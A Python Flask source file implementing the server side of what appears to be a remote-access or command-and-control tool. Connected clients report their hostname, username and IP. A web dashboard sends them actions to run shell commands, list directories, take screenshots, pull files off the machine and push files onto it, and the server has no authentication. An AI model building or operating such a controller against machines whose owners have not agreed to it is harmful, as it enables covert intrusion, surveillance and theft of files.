from __future__ import annotations

import base64
import json
import secrets
from datetime import datetime, timezone
from pathlib import Path
from threading import Event, RLock
from typing import Any, Dict, List, Optional, Set, Tuple

from flask import Flask, abort, jsonify, request, send_from_directory, Response
from flask_cors import CORS
from flask_sock import Sock
from simple_websocket import ConnectionClosed

BASE_DIR = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "dashboard"
ALLOWED_ACTIONS = {"system_info", "list_dir", "run_command", "download_file", "screenshot", "upload_file"}


class ClientSession:
    def __init__(self, client_id: str, websocket, metadata: Dict[str, Any]) -> None:
        self.client_id = client_id
        self.websocket = websocket
        self.metadata = metadata
        self.last_seen = datetime.now(timezone.utc)

    def model(self) -> Dict[str, Any]:
        return {
            "client_id": self.client_id,
            "metadata": self.metadata,
            "last_seen": self.last_seen.isoformat(),
        }

    def send_json(self, payload: Dict[str, Any]) -> None:
        self.websocket.send(json.dumps(payload))


class ConnectionHub:
    def __init__(self) -> None:
        self._clients: Dict[str, ClientSession] = {}
        self._dashboards: Set[Any] = set()
        self._lock = RLock()
        self._pending_downloads: Dict[str, Tuple[Event, Dict[str, Any]]] = {}
        self._pending_uploads: Dict[str, Tuple[Event, Dict[str, Any]]] = {}

    def register_client(self, client_id: str, websocket, metadata: Dict[str, Any]) -> None:
        with self._lock:
            self._clients[client_id] = ClientSession(client_id, websocket, metadata)
        self.broadcast_dashboards({"type": "client_connected", "client": self._clients[client_id].model()})

    def unregister_client(self, client_id: str) -> None:
        with self._lock:
            session = self._clients.pop(client_id, None)
        if session:
            self.broadcast_dashboards({"type": "client_disconnected", "client_id": client_id})

    def touch_client(self, client_id: str) -> None:
        with self._lock:
            session = self._clients.get(client_id)
            if session:
                session.last_seen = datetime.now(timezone.utc)

    def add_dashboard(self, websocket) -> None:
        with self._lock:
            self._dashboards.add(websocket)

    def remove_dashboard(self, websocket) -> None:
        with self._lock:
            self._dashboards.discard(websocket)

    def list_clients(self) -> List[Dict[str, Any]]:
        with self._lock:
            return [session.model() for session in self._clients.values()]

    def send_action(self, client_id: str, payload: Dict[str, Any]) -> None:
        with self._lock:
            session = self._clients.get(client_id)
        if not session:
            abort(404, description="Client not connected")
        try:
            session.send_json(payload)
        except ConnectionClosed:
            self.unregister_client(client_id)
            abort(410, description="Client connection closed")

    def broadcast_dashboards(self, payload: Dict[str, Any]) -> None:
        message = json.dumps(payload)
        with self._lock:
            dashboards = list(self._dashboards)
        stale: List[Any] = []
        for ws in dashboards:
            try:
                ws.send(message)
            except ConnectionClosed:
                stale.append(ws)
        for ws in stale:
            self.remove_dashboard(ws)

    def handle_client_response(self, client_id: str, payload: Dict[str, Any]) -> None:
        self.touch_client(client_id)
        action_id = payload.get("action_id")
        action_type = payload.get("action_type")
        
        # Check if this is a pending download request
        if action_type == "download_file" and action_id:
            with self._lock:
                pending = self._pending_downloads.get(action_id)
            if pending:
                event, result_dict = pending
                result_dict.update({
                    "success": payload.get("success", True),
                    "body": payload.get("body"),
                    "error": payload.get("body") if not payload.get("success", True) else None,
                })
                event.set()
                # Don't broadcast download responses to dashboards
                return
        
        # Check if this is a pending upload request
        if action_type == "upload_file" and action_id:
            with self._lock:
                pending = self._pending_uploads.get(action_id)
            if pending:
                event, result_dict = pending
                result_dict.update({
                    "success": payload.get("success", True),
                    "body": payload.get("body"),
                    "error": payload.get("body") if not payload.get("success", True) else None,
                })
                event.set()
                # Don't broadcast upload responses to dashboards
                return
        
        self.broadcast_dashboards(
            {
                "type": "client_response",
                "client_id": client_id,
                "action_id": action_id,
                "success": payload.get("success", True),
                "body": payload.get("body"),
                "action_type": action_type,
                "received_at": datetime.now(timezone.utc).isoformat(),
            }
        )
    
    def wait_for_download(self, action_id: str, timeout: float = 30.0) -> Dict[str, Any]:
        """Wait for a download response from a client."""
        event = Event()
        result_dict: Dict[str, Any] = {}
        with self._lock:
            self._pending_downloads[action_id] = (event, result_dict)
        
        try:
            if event.wait(timeout=timeout):
                return result_dict
            else:
                return {"success": False, "error": "Download timeout"}
        finally:
            with self._lock:
                self._pending_downloads.pop(action_id, None)
    
    def wait_for_upload(self, action_id: str, timeout: float = 60.0) -> Dict[str, Any]:
        """Wait for an upload response from a client."""
        event = Event()
        result_dict: Dict[str, Any] = {}
        with self._lock:
            self._pending_uploads[action_id] = (event, result_dict)
        
        try:
            if event.wait(timeout=timeout):
                return result_dict
            else:
                return {"success": False, "error": "Upload timeout"}
        finally:
            with self._lock:
                self._pending_uploads.pop(action_id, None)


hub = ConnectionHub()

app = Flask(
    __name__,
    static_folder=str(STATIC_DIR),
    static_url_path="/static",
)
app.config["JSON_SORT_KEYS"] = False
CORS(app)
sock = Sock(app)


def _validate_action_payload(data: Dict[str, Any]) -> Dict[str, Any]:
    if not isinstance(data, dict):
        abort(400, description="JSON body required")
    action_type = data.get("action_type")
    if action_type not in ALLOWED_ACTIONS:
        abort(400, description="Unsupported action type")
    args = data.get("args") or {}
    if not isinstance(args, dict):
        abort(400, description="Args must be an object")
    return {"action_type": action_type, "args": args}


@app.route("/")
def dashboard() -> Any:
    if not STATIC_DIR.exists():
        abort(500, description="Dashboard assets missing")
    return send_from_directory(str(STATIC_DIR), "index.html")


@app.get("/clients")
def get_clients() -> Any:
    return jsonify({"clients": hub.list_clients()})


@app.post("/clients/<client_id>/actions")
def trigger_action(client_id: str) -> Any:
    payload = _validate_action_payload(request.get_json(silent=True) or {})
    action_id = secrets.token_hex(8)
    message = {
        "type": "action",
        "action_id": action_id,
        "action_type": payload["action_type"],
        "args": payload["args"],
    }
    hub.send_action(client_id, message)
    return jsonify({"action_id": action_id})


@app.get("/clients/<client_id>/download")
def download_file(client_id: str) -> Any:
    """Download a file from a client."""
    file_path = request.args.get("path")
    if not file_path:
        abort(400, description="Missing 'path' parameter")
    
    # Send download action to client
    action_id = secrets.token_hex(8)
    message = {
        "type": "action",
        "action_id": action_id,
        "action_type": "download_file",
        "args": {"path": file_path},
    }
    
    try:
        hub.send_action(client_id, message)
    except Exception as e:
        abort(500, description=f"Failed to send download request: {str(e)}")
    
    # Wait for client response
    result = hub.wait_for_download(action_id, timeout=60.0)
    
    if not result.get("success"):
        error_msg = result.get("error", "Unknown error")
        abort(500, description=f"Download failed: {error_msg}")
    
    file_data = result.get("body", {})
    file_content_b64 = file_data.get("content")
    file_name = file_data.get("filename", file_path.split("/")[-1].split("\\")[-1])
    
    if not file_content_b64:
        abort(500, description="No file content received")
    
    try:
        file_content = base64.b64decode(file_content_b64)
    except Exception as e:
        abort(500, description=f"Failed to decode file content: {str(e)}")
    
    # Return file as download
    return Response(
        file_content,
        mimetype="application/octet-stream",
        headers={
            "Content-Disposition": f'attachment; filename="{file_name}"',
            "Content-Length": str(len(file_content)),
        },
    )


@app.post("/clients/<client_id>/upload")
def upload_file(client_id: str) -> Any:
    """Upload a file to a client."""
    # Check if file is present
    if 'file' not in request.files:
        abort(400, description="No file provided")
    
    file = request.files['file']
    if file.filename == '':
        abort(400, description="No file selected")
    
    # Get destination path
    dest_path = request.form.get('path')
    if not dest_path:
        abort(400, description="Missing 'path' parameter")
    
    # Read file content
    try:
        file_content = file.read()
        file_content_b64 = base64.b64encode(file_content).decode('utf-8')
    except Exception as e:
        abort(500, description=f"Failed to read file: {str(e)}")
    
    # Send upload action to client
    action_id = secrets.token_hex(8)
    message = {
        "type": "action",
        "action_id": action_id,
        "action_type": "upload_file",
        "args": {
            "path": dest_path,
            "filename": file.filename,
            "content": file_content_b64,
            "size": len(file_content)
        },
    }
    
    try:
        hub.send_action(client_id, message)
    except Exception as e:
        abort(500, description=f"Failed to send upload request: {str(e)}")
    
    # Wait for client response
    result = hub.wait_for_upload(action_id, timeout=60.0)
    
    if not result.get("success"):
        error_msg = result.get("error", "Unknown error")
        abort(500, description=f"Upload failed: {error_msg}")
    
    return jsonify({"success": True, "message": f"File uploaded successfully to {dest_path}"})


@sock.route("/ws/dashboard")
def websocket_dashboard(ws) -> None:
    hub.add_dashboard(ws)
    try:
        ws.send(json.dumps({"type": "client_list", "clients": hub.list_clients()}))
        while True:
            ws.receive()
    except ConnectionClosed:
        pass
    finally:
        hub.remove_dashboard(ws)


@sock.route("/ws/client")
def websocket_client(ws) -> None:
    client_id: Optional[str] = None
    try:
        hello_raw = ws.receive()
        payload = json.loads(hello_raw)
        if payload.get("type") != "hello":
            raise ValueError("First message must be a hello payload")
        client_id = payload.get("client_id") or secrets.token_hex(4)
        metadata = {
            "hostname": payload.get("hostname", "unknown"),
            "username": payload.get("username", "unknown"),
            "platform": payload.get("platform", "unknown"),
            "ip": payload.get("ip"),
        }
        hub.register_client(client_id, ws, metadata)
        ws.send(json.dumps({"type": "hello_ack", "client_id": client_id}))

        while True:
            raw = ws.receive()
            data = json.loads(raw)
            if data.get("type") == "response":
                hub.handle_client_response(client_id, data)
            else:
                hub.touch_client(client_id)
    except (ConnectionClosed, RuntimeError):
        pass
    except Exception:
        if client_id:
            hub.unregister_client(client_id)
        ws.close()
    finally:
        if client_id:
            hub.unregister_client(client_id)


if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port, debug=False)

